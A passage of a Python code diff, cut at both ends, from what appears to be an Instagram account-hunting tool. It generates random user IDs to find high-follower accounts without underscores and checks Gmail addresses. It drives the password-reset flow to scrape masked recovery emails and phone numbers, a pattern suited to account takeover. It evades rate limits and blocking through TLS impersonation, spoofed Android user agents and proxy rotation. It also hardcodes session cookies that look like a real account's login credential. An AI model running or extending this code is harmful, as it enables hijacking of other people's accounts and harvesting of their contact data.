+            gap = 0.12 * attempt if _IS_TERMUX else 0.08 * attempt
+            time.sleep(gap)
+        try:
+            result = _gmail_lookup_once(email, force_tl=force_tl, hunt_fast=use_fast)
+        except Exception as exc:
+            last_msg = f"gmail_error -> {exc}"
+            if attempt + 1 < len(strategies):
+                _gmail_force_refresh_tl()
+            continue
+        if isinstance(result, str):
+            last_msg = result
+            if attempt + 1 < len(strategies):
+                _gmail_force_refresh_tl()
+            continue
+        _ok, msg = result
+        if msg != "gmail_parse_failed":
+            return result
+        last_msg = msg
+        if attempt + 1 < len(strategies):
+            _gmail_force_refresh_tl()
+    if last_msg == "gmail_parse_failed":
+        return "gmail_error -> token stale or Google blocked this IP"
+    return last_msg
+
+
+def check_gmail_robust(email, *, hunt_fast_prefer: bool = True):
+    return _gmail_lookup_retry_core(
+        email,
+        max_attempts=GMAIL_LOOKUP_MAX_ATTEMPTS,
+        hunt_fast_prefer=hunt_fast_prefer,
+    )
+
+
+def check_gmail_hunt_fast(email):
+    """Hunt path — mass-stable gmail (shared with /gmail_lookup)."""
+    return check_gmail_robust(email, hunt_fast_prefer=True)
+
+
+def check_gmail_hunt_cycle(email):
+    return _gmail_lookup_retry_core(
+        email,
+        max_attempts=_HUNT_GMAIL_MAX_ATTEMPTS,
+        hunt_fast_prefer=True,
+    )
+
+
+def check_gmail(email, *, _retried: bool = False):
+    return check_gmail_robust(email, hunt_fast_prefer=not _retried)
+
+
+def _mobile_profile_headers(csrf=""):
+    device_id = str(uuid.uuid4())
+    android_id = "android-" + secrets.token_hex(8)
+    headers = {
+        "X-IG-App-ID": _IG_MOBILE_APP_ID,
+        "User-Agent": _IG_MOBILE_UA,
+        "Accept": "*/*",
+        "Accept-Language": "en-IN, en-US",
+        "X-IG-Device-Id": device_id,
+        "X-IG-Android-Id": android_id,
+        "X-IG-Family-Device-Id": str(uuid.uuid4()),
+        "X-IG-Timezone-Offset": str(int(time.timezone)),
+        "X-MID": base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip("="),
+        "X-Pigeon-Session-Id": f"UFS-{uuid.uuid4()}-0",
+    }
+    if csrf:
+        headers["X-CSRFToken"] = csrf
+    return headers
+
+
+def _parse_media_count_from_user(user):
+    if not isinstance(user, dict):
+        return None
+    mc = user.get("media_count")
+    if mc is not None and mc != "":
+        try:
+            return int(mc)
+        except (TypeError, ValueError):
+            pass
+    edge = user.get("edge_owner_to_timeline_media")
+    if isinstance(edge, dict) and edge.get("count") is not None:
+        try:
+            return int(edge.get("count"))
+        except (TypeError, ValueError):
+            pass
+    return None
+
+
+def _parse_media_count_from_html(text):
+    for pattern in (_PROFILE_MEDIA_EDGE_RE, _PROFILE_MEDIA_COUNT_RE):
+        match = pattern.search(text or "")
+        if match:
+            try:
+                return int(match.group(1))
+            except (TypeError, ValueError):
+                continue
+    return None
+
+
+def _apply_profile_user(out, user):
+    if not isinstance(user, dict):
+        return out
+    name = (user.get("full_name") or "").strip()
+    if name:
+        out["full_name"] = name
+    mc = _parse_media_count_from_user(user)
+    if mc is not None:
+        out["media_count"] = mc
+    for key in ("profile_pic_url_hd", "profile_pic_url"):
+        url = (user.get(key) or "").strip()
+        if url.startswith("http"):
+            out[key] = url
+            break
+    hd = user.get("hd_profile_pic_url_info")
+    if isinstance(hd, dict):
+        url = (hd.get("url") or "").strip()
+        if url.startswith("http"):
+            out["profile_pic_url_hd"] = url
+            out.setdefault("profile_pic_url", url)
+    return out
+
+
+def _profile_web_profile_request(username, *, csrf="", fresh_session=False):
+    headers = _mobile_profile_headers(csrf)
+    params = {"username": username}
+    url = _PROFILE_WEB_URL
+    if fresh_session:
+        probe = requests.Session()
+        try:
+            _ig_http_get(
+                "https://www.instagram.com/",
+                headers={"User-Agent": _IG_WEB_UA},
+                timeout=12,
+                http=probe,
+            )
+            csrf = probe.cookies.get("csrftoken") or csrf
+            headers = _mobile_profile_headers(csrf)
+            return _ig_http_get(
+                url, params=params, headers=headers, timeout=HUNT_LOOKUP_TIMEOUT, http=probe,
+            )
+        except Exception:
+            return None
+    try:
+        return _ig_http_get(
+            url, params=params, headers=headers, timeout=HUNT_LOOKUP_TIMEOUT, http=session,
+        )
+    except Exception:
+        return None
+
+
+def _profile_curl_request(username):
+    """curl_cffi — chrome131_android on Termux (Posts count); chrome131 on desktop."""
+    try:
+        from curl_cffi import requests as curl_requests
+    except ImportError:
+        return None
+    imp = "chrome131_android" if _is_termux() else "chrome131"
+    proxy_kw = {}
+    if vps_proxy_enabled():
+        proxies = next(iter(proxy_attempts(proxy_tries=1)), None)
+        if proxies:
+            proxy_kw["proxies"] = proxies
+    for label in ((imp,) if _is_termux() else (imp, "chrome131_android", "chrome124")):
+        try:
+            http = curl_requests.Session(impersonate=label)
+            return http.get(
+                _PROFILE_WEB_URL,
+                params={"username": username},
+                headers={
+                    "X-IG-App-ID": _IG_MOBILE_APP_ID,
+                    "User-Agent": _IG_MOBILE_UA,
+                    "Accept-Language": "en-IN, en-US",
+                },
+                timeout=25,
+                **proxy_kw,
+            )
+        except Exception:
+            continue
+    return None
+
+
+def _profile_tls_request(username):
+    if _is_termux():
+        return None
+    try:
+        import tls_client
+    except Exception:
+        return None
+    try:
+        http = tls_client.Session(
+            client_identifier="okhttp4_android_13",
+            random_tls_extension_order=True,
+        )
+        return http.get(
+            _PROFILE_WEB_URL,
+            params={"username": username},
+            headers={
+                "X-IG-App-ID": _IG_MOBILE_APP_ID,
+                "User-Agent": _IG_MOBILE_UA,
+                "Accept-Language": "en-IN, en-US",
+            },
+            timeout_seconds=25,
+        )
+    except Exception:
+        return None
+
+
+def fetch_user_profile(username, pk=None):
+    """
+    Hit-time profile enrich: posts, name, pfp.
+    web_profile_info is the only reliable media_count source (graphql hover omits it).
+    """
+    username = (username or "").strip().lstrip("@")
+    if not username:
+        return {}
+    pk = str(pk or "").strip()
+    out = {
+        "username": username,
+        "full_name": None,
+        "media_count": None,
+        "profile_pic_url": None,
+        "profile_pic_url_hd": None,
+    }
+    csrf, _lsd = load(force_refresh=False)
+
+    curl_resp = _profile_curl_request(username)
+    if curl_resp is not None and curl_resp.status_code == 200:
+        user = (curl_resp.json().get("data") or {}).get("user") or {}
+        if user:
+            _apply_profile_user(out, user)
+            if out["media_count"] is not None:
+                return out
+
+    tls_resp = _profile_tls_request(username)
+    if tls_resp is not None and tls_resp.status_code == 200:
+        user = (tls_resp.json().get("data") or {}).get("user") or {}
+        if user:
+            _apply_profile_user(out, user)
+            if out["media_count"] is not None:
+                return out
+
+    for attempt in range(5):
+        if attempt:
+            time.sleep(1.2 + attempt * 0.8)
+        if attempt in (2, 4):
+            csrf, _lsd = load(force_refresh=True)
+        resp = _profile_web_profile_request(
+            username,
+            csrf=csrf,
+            fresh_session=(attempt >= 3),
+        )
+        if resp is None:
+            continue
+        if resp.status_code == 429:
+            continue
+        if resp.ok:
+            user = (resp.json().get("data") or {}).get("user") or {}
+            if user:
+                _apply_profile_user(out, user)
+                if out["media_count"] is not None:
+                    return out
+
+    if pk:
+        try:
+            gql_headers = {
+                "User-Agent": _IG_WEB_UA,
+                "Content-Type": "application/x-www-form-urlencoded",
+                "x-bloks-version-id": (
+                    "ad0f1f5e41c2d9fcde83dfd68eea4def768b66bc3029c58e846d7c1dda44ba2a"
+                ),
+                "x-ig-app-id": "936619743392459",
+                "x-fb-lsd": _lsd,
+                "x-csrftoken": csrf,
+                "origin": "https://www.instagram.com",
+                "referer": f"https://www.instagram.com/{username}/",
+            }
+            payload = {
+                "lsd": _lsd,
+                "variables": json.dumps({"userID": pk, "username": username}),
+                "doc_id": "7717269488336001",
+            }
+            resp = _ig_http_post(
+                "https://www.instagram.com/api/graphql",
+                headers=gql_headers,
+                data=payload,
+                timeout=INSTAGRAM_HTTP_TIMEOUT,
+                http=session,
+            )
+            if not _ig_response_is_blocked(resp):
+                body = resp.json()
+                user = (body.get("data") or {}).get("user") or {}
+                _apply_profile_user(out, user)
+                if out["media_count"] is not None:
+                    return out
+        except Exception:
+            pass
+
+    try:
+        resp = _ig_http_get(
+            f"https://www.instagram.com/{username}/",
+            headers={
+                "User-Agent": _IG_WEB_UA,
+                "Accept-Language": "en-US,en;q=0.9",
+            },
+            timeout=HUNT_LOOKUP_TIMEOUT,
+            http=session,
+        )
+        if resp.ok and not _ig_response_is_blocked(resp):
+            mc = _parse_media_count_from_html(resp.text)
+            if mc is not None:
+                out["media_count"] = mc
+    except Exception:
+        pass
+
+    return out
+
+
+def _ig_gen_random_lsd(length=16):
+    alphabet = "azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890"
+    return "".join(random.choice(alphabet) for _ in range(length))
+
+
+def _ig_gen_android_user_agent():
+    android_ver = random.choice(
+        ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"],
+    )
+    dpi = random.randint(100, 1300)
+    w, h = random.randint(200, 2000), random.randint(200, 2000)
+    brand = random.choice(
+        [
+            "SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE",
+            "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME",
+        ],
+    )
+    rnd = str(random.randint(_IG_GEN_USER_ID_MIN, _IG_GEN_USER_ID_MAX))
+    rnd = str(random.randint(2500000000, 21254029834))
+    return (
+        f"Instagram 311.0.0.32.118 Android ({android_ver}; {dpi}dpi; {w}x{h}; "
+        f"{brand}; SM-T{rnd}; SM-T{rnd}; qcom; en_US; 545986{random.randint(111, 999)})"
+    )
+
+
+def _ig_gen_profile_variables(user_id):
+    return json.dumps(
+        {
+            "enable_integrity_filters": True,
+            "id": str(user_id),
+            "__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider": True,
+            "__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider": False,
+            "__relay_internal__pv__PolarisWebSchoolsEnabledrelayprovider": False,
+            "__relay_internal__pv__PolarisRepostsConsumptionEnabledrelayprovider": False,
+        },
+        separators=(",", ":"),
+    )
+
+
+def _parse_ig_gen_graphql_response(response):
+    if response is None:
+        return None, "no response"
+    status = int(getattr(response, "status_code", 0) or 0)
+    if status == 429:
+        return None, "instagram rate limited (IP/VPN — wait or rotate)"
+    if _ig_response_is_blocked(response):
+        return None, "instagram blocked this IP (html response)"
+    try:
+        body = response.json()
+    except ValueError:
+        return None, "instagram bad response (not json)"
+    if _ig_body_rate_limited(body):
+        return None, "instagram rate limited (IP/VPN — wait or rotate)"
+    user = (body.get("data") or {}).get("user")
+    if not isinstance(user, dict) or not user.get("username"):
+        return None, "no user in response"
+    return user, ""
+
+
+def _ig_gen_passes_min_followers(user, min_val):
+    followers = user.get("follower_count")
+    if followers is None:
+        return False, "no follower_count in response"
+    if int(followers) < int(min_val):
+        return False, f"under {min_val} followers"
+    return True, ""
+
+
+def _gen_ig_graphql_post(min_val, *, retried=False, variant=0):
+    """Random user_id → PolarisProfilePageContentQuery graphql (sinsta-style)."""
+    if _ig_in_block_cooldown():
+        return False, None, None, "instagram rate limited (IP/VPN — wait or rotate)"
+    min_val = str(min_val)
+    user_id = random.randrange(_IG_GEN_USER_ID_MIN, _IG_GEN_USER_ID_MAX)
+    lsd = _ig_gen_random_lsd()
+    headers = {
+        "accept": "*/*",
+        "accept-language": "en,en-US;q=0.9",
+        "content-type": "application/x-www-form-urlencoded",
+        "dnt": "1",
+        "origin": "https://www.instagram.com",
+        "priority": "u=1, i",
+        "referer": "https://www.instagram.com/cristiano/following/",
+        "user-agent": _ig_gen_android_user_agent(),
+        "x-fb-friendly-name": "PolarisUserHoverCardContentV2Query",
+        "x-fb-lsd": lsd,
+    }
+    data = {
+        "lsd": lsd,
+        "fb_api_caller_class": "RelayModern",
+        "fb_api_req_friendly_name": "PolarisProfilePageContentQuery",
+        "variables": _ig_gen_profile_variables(user_id),
+        "server_timestamps": "true",
+        "doc_id": _IG_GEN_GRAPHQL_DOC_ID,
+    }
+    try:
+        response = _ig_http_post(
+            _HUNT_IG_GRAPHQL_URL,
+            data=data,
+            headers=headers,
+            timeout=INSTAGRAM_HTTP_TIMEOUT,
+            http=_get_ig_graphql_session(),
+        )
+    except Exception as exc:
+        return False, None, None, str(exc)[:200]
+    user, err = _parse_ig_gen_graphql_response(response)
+    if user is None:
+        if not retried and err in (
+            "instagram rate limited (IP/VPN — wait or rotate)",
+            "instagram blocked this IP (html response)",
+            "instagram bad response (not json)",
+        ):
+            _fetch_fresh_ig_tokens()
+            return _gen_ig_graphql_post(min_val, retried=True, variant=variant)
+        if "rate limited" in err or "blocked" in err:
+            _mark_ig_gen_blocked()
+        return False, None, None, err or "lookup failed"
+    username = user.get("username")
+    followers = user.get("follower_count")
+    uid = user.get("pk")
+    if not username or uid is None or followers is None:
+        return False, None, None, "no user in response"
+    ok_min, min_msg = _ig_gen_passes_min_followers(user, min_val)
+    if not ok_min:
+        return False, None, None, min_msg
+    if "_" in str(username):
+        return False, None, None, "underscore username"
+    info = dict(user)
+    info["generated_from_user_id"] = str(user_id)
+    return (
+        True,
+        str(username),
+        info,
+        f"Account found with more than {min_val} followers.",
+    )
+
+
+def gen_ig_once(min_val, stop_event=None):
+    """Several quick graphql tries — raises success rate vs one random id."""
+    if _ig_in_block_cooldown():
+        return False, None, None, "instagram rate limited (IP/VPN — wait or rotate)"
+    min_val = str(min_val)
+    last_msg = "no match"
+    for attempt in range(IG_GEN_ONCE_INNER_TRIES):
+        if stop_event is not None and stop_event.is_set():
+            return False, None, None, "stopped"
+        try:
+            status, username, info, msg = _gen_ig_graphql_post(
+                min_val, variant=attempt,
+            )
+        except Exception as exc:
+            last_msg = str(exc)[:200]
+            continue
+        last_msg = msg
+        if status and username:
+            return True, username, info, msg
+    return False, None, None, last_msg
+
+
+def gen_ig(min_val, stop_event=None, max_attempts=None):
+    """Retry until a username is found or cap reached."""
+    global email
+    min_val = str(min_val)
+    cap = max(1, int(max_attempts or GEN_IG_MAX_ATTEMPTS))
+    last_msg = "no match"
+    for attempt in range(cap):
+        if stop_event is not None and stop_event.is_set():
+            return False, None, None, "stopped"
+        status, username, info, msg = gen_ig_once(min_val, stop_event=stop_event)
+        last_msg = msg
+        if status and username:
+            return True, username, info, msg
+        if attempt + 1 < cap:
+            time.sleep(0.015)
+    return False, None, None, (
+        f"Failed after {cap} attempts: {last_msg}"
+    )
+
+
+def _ig_gen_result_tuple(status, username, info_data, response_text):
+    """Normalize — callers only treat as success when username is present."""
+    username = str(username or "").strip()
+    ok = bool(status and username)
+    return ok, username if ok else None, info_data, response_text
+
+
+def _buffer_try_get(min_val):
+    min_val = str(min_val)
+    buf = _ig_gen_buffers.get(min_val)
+    if not buf:
+        return None
+    try:
+        res = buf.get_nowait()
+    except asyncio.QueueEmpty:
+        return None
+    if res and len(res) >= 4 and res[0] and res[1]:
+        return res
+    return None
+
+
+def _ig_block_seconds_left() -> float:
+    now = time.time()
+    gen_left = max(0.0, _ig_gen_block_until - now)
+    lookup_left = max(0.0, _ig_lookup_block_until - now)
+    return max(gen_left, lookup_left)
+
+
+def _ig_gen_block_seconds_left() -> float:
+    if not _ig_in_gen_block_cooldown():
+        return 0.0
+    return max(0.0, _ig_gen_block_until - time.time())
+
+
+def _ig_lookup_block_seconds_left() -> float:
+    if not _ig_in_lookup_block_cooldown():
+        return 0.0
+    return max(0.0, _ig_lookup_block_until - time.time())
+
+
+
+# --- IG wbloks contact recovery (inlined for 2-file release) ---
+_RESPONSES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "responses")
+os.makedirs(_RESPONSES_DIR, exist_ok=True)
+
+WBLOCKS_HTTP_TIMEOUT = 20
+BOOTSTRAP_HTTP_TIMEOUT = 15
+
+RECOVERY_URL = "https://www.instagram.com/accounts/password/reset/"
+USER_AGENT = (
+    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
+    "(KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36"
+)
+
+# Session cookies are still needed with the current hardcoded bloks payload.
+# Removing them without a full logged-out bootstrap breaks fb_dtsg/lsd matching.
+# Hardcoded sessionid is often expired → IG returns 429 on bootstrap. Prefer logged-out;
+# bootstrap_recovery_session() falls back automatically when logged-in tokens are missing.
+USE_LOGGED_IN_SESSION = False
+
+BASE_COOKIES = {
+    "datr": "drueaT-Mec1uOMARZ5giSXbi",
+    "ig_did": "01076FE5-57FB-4B7F-A186-50F2047AEE9C",
+    "mid": "aZ67dgABAAGBHw-P3_ILGWvl1aRb",
+    "ps_l": "1",
+    "ps_n": "1",
+    "dpr": "2.4000000953674316",
+}
+LOGGED_IN_COOKIES = {
+    "ds_user_id": "56939731259",
+    "sessionid": (
+        "56939731259%3AzJPg6MVevx6U61%3A0%3A"
+        "AYg9Wj7ogENEcHzHm9Im4Fn569nDlukhSk-MSgKqwxw"
+    ),
+    "rur": (
+        '"CLN\\05456939731259\\0541812871654:01ffc82fb81c546526b7299310cb47d23'
+        "fbb0d178c7bb68ca255ce2fb9ed7489e494dcb4\""
+    ),
+}
+
+ARM_CONTEXT_RE = re.compile(r"Ad[A-Za-z0-9_-]{20,}\|arm")
+AUTH_METHOD_TOKEN_RE = r"Ad[A-Za-z0-9_-]{20,320}"
+AUTH_METHOD_ASYNC_PATTERNS = (
+    rf'\\"phone\\",\s*false,\s*false,\s*\\"({AUTH_METHOD_TOKEN_RE})\\"',
+    rf'\\"email\\",\s*false,\s*false,\s*\\"({AUTH_METHOD_TOKEN_RE})\\"',
+    rf'\\"phone\\",\s*(?:true|false),\s*\\"({AUTH_METHOD_TOKEN_RE})\\"',
+    rf'\\"email\\",\s*(?:true|false),\s*\\"({AUTH_METHOD_TOKEN_RE})\\"',
+    rf'\\"password\\",\s*(?:true|false),\s*\\"({AUTH_METHOD_TOKEN_RE})\\"',
+    rf'\\"(?:phone|email|password)\\",\s*(?:true|false),\s*(?:true|false),\s*\\"({AUTH_METHOD_TOKEN_RE})\\"',
+)
+MASKED_EMAIL_RE = re.compile(r"[a-zA-Z0-9]\*+[a-zA-Z0-9]@[a-zA-Z0-9\*\.\-]+")
+FULL_EMAIL_RE = re.compile(r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}")
+SENT_CODE_EMAIL_RE = re.compile(
+    r"We sent a code to ([a-zA-Z0-9*._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})",
+    re.IGNORECASE,
+)
+MASKED_PHONE_RE = re.compile(r"\+\d{1,3}(?:\s+[\*]+\s*)+\d{2,4}")
+AUTH_METHOD_APPID = "com.bloks.www.caa.ar.auth_method"
+EMAIL_CONFIRM_APPID = "com.bloks.www.caa.ar.authentication_confirmation"
+EMAIL_CONFIRM_ASYNC_APPID = "com.bloks.www.caa.ar.authentication_confirmation.async"
+INITIATE_VIEW_APPID = "com.bloks.www.caa.ar.initiate_view"
+STEP2_ROUTE_RE = re.compile(
+    r'app_id\\",\s*\\"(com\.bloks\.www\.caa\.ar\.(?:auth_method|authentication_confirmation))\\"'
+    r',\s*\\"tti_marker_id\\",\s*\d+,\s*\\"screen_id\\",\s*\\"([^\\]+)\\"'
+)
+STEP4_ROUTE_RE = re.compile(
+    r'app_id\\",\s*\\"com\.bloks\.www\.caa\.ar\.initiate_view\\"'
+    r',\s*\\"tti_marker_id\\",\s*\d+,\s*\\"screen_id\\",\s*\\"([^\\]+)\\"'
+)
+
+
+def strip_ig_json_prefix(text: str) -> str:
+    text = (text or "").strip()
+    if text.startswith("for (;;);"):
+        return text[9:].strip()
+    return text
+
+
+def extract_arm_context_token(text: str) -> str | None:
+    """Pull IG bloks context_data token (Ad...|arm) from wbloks response text."""
+    body = strip_ig_json_prefix(text)
+    if not body:
+        return None
+    match = ARM_CONTEXT_RE.search(body)
+    return match.group(0) if match else None
+
+
+def _auth_method_tokens(body: str, method: str) -> list[str]:
+    tokens: list[str] = []
+    for pattern in (
+        rf'\\"{method}\\",\s*false,\s*false,\s*\\"({AUTH_METHOD_TOKEN_RE})\\"',
+        rf'\\"{method}\\",\s*(?:true|false),\s*\\"({AUTH_METHOD_TOKEN_RE})\\"',
+    ):
+        for match in re.finditer(pattern, body):
+            token = match.group(1)
+            if "|arm" not in token:
+                tokens.append(token)
+    return tokens
+
+
+def _best_auth_token(tokens: list[str]) -> str | None:
+    if not tokens:
+        return None
+    return min(tokens, key=len)
+
+
+def extract_auth_method_async_params(text: str) -> str | None:
+    """Pull auth_method_async_params token from step2 auth_method response."""
+    body = strip_ig_json_prefix(text)
+    if not body:
+        return None
+    for pattern in AUTH_METHOD_ASYNC_PATTERNS:
+        match = re.search(pattern, body)
+        if not match:
+            continue
+        token = match.group(1)
+        if "|arm" not in token:
+            return token
+    return None
+
+
+def extract_auth_method_options(text: str) -> list[tuple[str, str]]:
+    """Return auth methods offered on step2, e.g. [('phone', 'Ad...'), ('email', 'Ad...')]."""
+    body = strip_ig_json_prefix(text)
+    if not body:
+        return []
+    options: list[tuple[str, str]] = []
+    for method in ("email", "phone", "password"):
+        token = _best_auth_token(_auth_method_tokens(body, method))
+        if token:
+            options.append((method, token))
+    return options
+
+
+def pick_step3_auth(
+    options: list[tuple[str, str]], response_text: str = ""
+) -> tuple[str, str, str]:
+    """Choose step3 auth_method, async token, and is_auth_method_rejected."""
+    methods = {method: token for method, token in options}
+    if "phone" in methods:
+        return "phone", methods["phone"], "1"
+    if "email" in methods:
+        return "email", methods["email"], "0"
+
+    body = strip_ig_json_prefix(response_text)
+    if extract_masked_phone(response_text) or "mobile number" in body.lower():
+        token = extract_auth_method_async_params(response_text)
+        if token:
+            return "phone", token, "1"
+
+    if "password" in methods:
+        return "password", methods["password"], "0"
+    return "phone", "", "1"
+
+
+def extract_step2_route(text: str) -> tuple[str, str]:
+    """Read step1 bloks payload for the next recovery screen."""
+    body = strip_ig_json_prefix(text)
+    match = STEP2_ROUTE_RE.search(body or "")
+    if match:
+        return match.group(1), match.group(2)
+    return AUTH_METHOD_APPID, "19q6u5:2"
+
+
+def is_dual_auth_flow(appid: str) -> bool:
+    return appid == AUTH_METHOD_APPID
+
+
+def extract_confirmation_async_context(text: str) -> str | None:
+    """Token for Try another way -> authentication_confirmation.async."""
+    body = strip_ig_json_prefix(text)
+    pos = body.find("authentication_confirmation.async")
+    if pos < 0:
+        return None
+    chunk = body[pos : pos + 12000]
+    tokens = [
+        t for t in re.findall(r"Ad[A-Za-z0-9_-]{20,512}", chunk)
+        if "|arm" not in t
+    ]
+    return max(tokens, key=len) if tokens else None
+
+
+def extract_qpl_instance_id(
+    text: str, anchor: str = "authentication_confirmation.async"
+) -> str | None:
+    body = strip_ig_json_prefix(text)
+    pos = body.find(anchor)
+    if pos < 0:
+        return None
+    match = re.search(r"i64\.Const,\s*(\d+)", body[pos : pos + 12000])
+    return match.group(1) if match else None
+
+
+def extract_step4_screen_id(text: str) -> str | None:
+    body = strip_ig_json_prefix(text)
+    match = STEP4_ROUTE_RE.search(body or "")
+    return match.group(1) if match else None
+
+
+def extract_visible_texts(text: str) -> list[str]:
+    body = strip_ig_json_prefix(text)
+    if not body:
+        return []
+    seen: set[str] = set()
+    visible: list[str] = []
+    for raw in re.findall(r'"text":"((?:\\.|[^"\\])*)"', body):
+        item = raw
+        if "\\u" in item:
+            try:
+                item = bytes(item, "utf-8").decode("unicode_escape")
+            except UnicodeDecodeError:
+                pass
+        item = item.replace("\\u0040", "@").strip()
+        if not item or item in seen or item.startswith("(bk."):
+            continue
+        seen.add(item)
+        visible.append(item)
+    return visible
+
+
+def log_masked_contacts(label: str, text: str) -> None:
+    masked_email = extract_masked_email(text)
+    masked_phone = extract_masked_phone(text)
+    print(f"[{label}] masked_email: {masked_email or 'NOT FOUND'}")
+    print(f"[{label}] masked_phone: {masked_phone or 'NOT FOUND'}")
+    visible = extract_visible_texts(text)
+    useful = [
+        t for t in visible
+        if "@" in t or "*" in t or "email" in t.lower() or "sms" in t.lower()
+        or "password" in t.lower() or "choose" in t.lower() or "incorrect" in t.lower()
+    ]
+    if useful:
+        print(f"[{label}] visible:")
+        for item in useful:
+            print(f"  - {item}")
+
+
+def _clean_masked_email(value: str) -> str:
+    return value.rstrip(".,;:!? ")
+
+
+def extract_masked_email(text: str) -> str | None:
+    body = strip_ig_json_prefix(text).replace("\\u0040", "@")
+    if not body:
+        return None
+    sent_code = SENT_CODE_EMAIL_RE.search(body)
+    if sent_code:
+        return _clean_masked_email(sent_code.group(1))
+    match = MASKED_EMAIL_RE.search(body)
+    if match:
+        return _clean_masked_email(match.group(0))
+    for item in extract_visible_texts(text):
+        sent_code = SENT_CODE_EMAIL_RE.search(item)
+        if sent_code:
+            return _clean_masked_email(sent_code.group(1))
+        embedded = MASKED_EMAIL_RE.search(item)
+        if embedded:
+            return _clean_masked_email(embedded.group(0))
+        if "*" in item and "@" in item:
+            return _clean_masked_email(item)
+        if FULL_EMAIL_RE.fullmatch(item.strip()):
+            return item.strip()
+    return None
+
+
+def extract_masked_phone(text: str) -> str | None:
+    body = strip_ig_json_prefix(text)
+    if not body:
+        return None
+    match = MASKED_PHONE_RE.search(body)
+    if match:
+        return match.group(0)
+    for item in extract_visible_texts(text):
+        if item.startswith("+") and "*" in item:
+            return item
+    return None
+
+
+def log_context_token(label: str, token: str | None) -> None:
+    if not token:
+        print(f"[{label}] context_data token: NOT FOUND")
+        return
+    print(
+        f"[{label}] context_data token: {token[:20]}...{token[-8:]} "
+        f"({len(token)} chars)"
+    )
+
+
+def log_auth_method_async_token(label: str, token: str | None) -> None:
+    if not token:
+        print(f"[{label}] auth_method_async_params: NOT FOUND")
+        return
+    print(
+        f"[{label}] auth_method_async_params: {token[:20]}...{token[-8:]} "
+        f"({len(token)} chars)"
+    )
+
+
+def jazoest_from_dtsg(fb_dtsg: str) -> str:
+    return str(2 + sum(ord(c) for c in fb_dtsg))
+
+
+def _bootstrap_pull(use_logged_in: bool, *, http_timeout: int = BOOTSTRAP_HTTP_TIMEOUT) -> dict:
+    """Single bootstrap attempt against the password-reset page."""
+    sess = requests.Session()
+    cookies = BASE_COOKIES.copy()
+    if use_logged_in:
+        cookies.update(LOGGED_IN_COOKIES)
+    sess.cookies.update(cookies)
+    resp = _ig_http_get(
+        RECOVERY_URL,
+        headers={"user-agent": USER_AGENT, "accept-language": "en-US"},
+        timeout=http_timeout,
+        http=sess,
+    )
+    html = resp.text or ""
+    lsd = (re.search(r'"LSD",\[\],\{"token":"([^"]+)"', html) or [None, ""])[1]
+    fb_dtsg = (re.search(r'"dtsg":\{"token":"([^"]+)"', html) or [None, ""])[1]
+    rev = (re.search(r'"client_revision":(\d+)', html) or [None, ""])[1]
+    hsi = (re.search(r'"hsi":"(\d+)"', html) or [None, ""])[1]
+    spin_t = (re.search(r'"__spin_t":(\d+)', html) or [None, ""])[1]
+    merged = cookies.copy()
+    merged.update(requests.utils.dict_from_cookiejar(sess.cookies))
+    return {
+        "cookies": merged,
+        "lsd": (lsd or "").strip(),
+        "fb_dtsg": (fb_dtsg or "").strip(),
+        "jazoest": jazoest_from_dtsg(fb_dtsg) if fb_dtsg else "",
+        "__rev": rev,
+        "__spin_r": rev,
+        "__hsi": hsi,
+        "__spin_t": spin_t,
+        "status_code": resp.status_code,
+        "used_logged_in": use_logged_in,
+    }
+
+
+def bootstrap_recovery_session(
+    use_logged_in: bool = USE_LOGGED_IN_SESSION,
+    *,
+    http_timeout: int = BOOTSTRAP_HTTP_TIMEOUT,
+) -> dict:
+    """Refresh csrftoken + fb_dtsg + lsd; fall back to logged-out if logged-in is stale."""
+    boot = _bootstrap_pull(use_logged_in, http_timeout=http_timeout)
+    if (not boot["lsd"] or not boot["fb_dtsg"]) and use_logged_in:
+        boot = _bootstrap_pull(False, http_timeout=http_timeout)
+        boot["fallback_logged_out"] = True
+    if boot.get("status_code") == 429:
+        boot["rate_limited"] = True
+    return boot
+
+
+def apply_session_tokens(data: dict, boot: dict) -> None:
+    for key in ("fb_dtsg", "lsd", "jazoest", "__rev", "__spin_r", "__hsi", "__spin_t"):
+        value = boot.get(key)
+        if value:
+            data[key] = value
+
+
+def check_ig_response(label: str, text: str) -> bool:
+    body = strip_ig_json_prefix(text)
+    if "session expired" in body.lower():
+        print(f"[{label}] IG session expired in response")
+    if '"error":' not in body:
+        return True
+    summary = re.search(r'"errorSummary":"([^"]+)"', body)
+    print(f"[{label}] IG error: {summary.group(1) if summary else body[:120]}")
+    return False
+
+
+def run_recovery(
+    username: str,
+    *,
+    verbose: bool = False,
+    http_timeout: int = WBLOCKS_HTTP_TIMEOUT,
+    write_responses: bool = True,
+) -> dict:
+    """Run the 4-step IG recovery flow and return masked contacts."""
+    started = time.perf_counter()
+    contacts = {"email": None, "phone": None}
+
+    def merge(text: str) -> None:
+        email = extract_masked_email(text)
+        phone = extract_masked_phone(text)
+        if email:
+            contacts["email"] = email
+        if phone:
+            contacts["phone"] = phone
+
+    boot = bootstrap_recovery_session(http_timeout=http_timeout)
+    if verbose:
+        print(
+            "[bootstrap] session ready:"
+            f" logged_in={boot.get('used_logged_in')}"
+            f" fallback={boot.get('fallback_logged_out')}"
+            f" status={boot.get('status_code')}"
+            f" csrftoken={bool(boot['cookies'].get('csrftoken'))}"
+            f" lsd={bool(boot['lsd'])}"
+            f" fb_dtsg={bool(boot['fb_dtsg'])}"
+        )
+
+    if boot.get("rate_limited") or not boot.get("lsd") or not boot.get("fb_dtsg"):
+        err = "rate_limited" if boot.get("rate_limited") or boot.get("status_code") == 429 else "session_bootstrap_failed"
+        return {
+            "ok": False,
+            "username": username,
+            "flow": "unknown",
+            "email": None,
+            "phone": None,
+            "error": err,
+            "response_time_ms": round((time.perf_counter() - started) * 1000),
+        }
+
